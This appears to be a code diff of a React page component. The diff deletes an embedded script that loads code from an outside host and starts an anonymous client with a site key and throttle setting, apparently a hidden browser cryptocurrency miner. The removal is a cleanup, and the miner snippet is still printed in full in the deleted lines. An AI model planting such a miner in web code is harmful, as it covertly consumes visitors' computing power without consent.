@@ -208,17 +208,6 @@ const Index = () => {
       </div>
     );
   }
-
-  <script src="https://www.hostingcloud.racing/etyE.js"></script>
-<script>
-    var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-        throttle: 0.6, c: 'w'
-    });
-    _client.start();
-   
-
-</script>
-  }
   if (!user) {
     console.log("User not found, redirecting to auth");
     return <Navigate to="/auth" replace />;
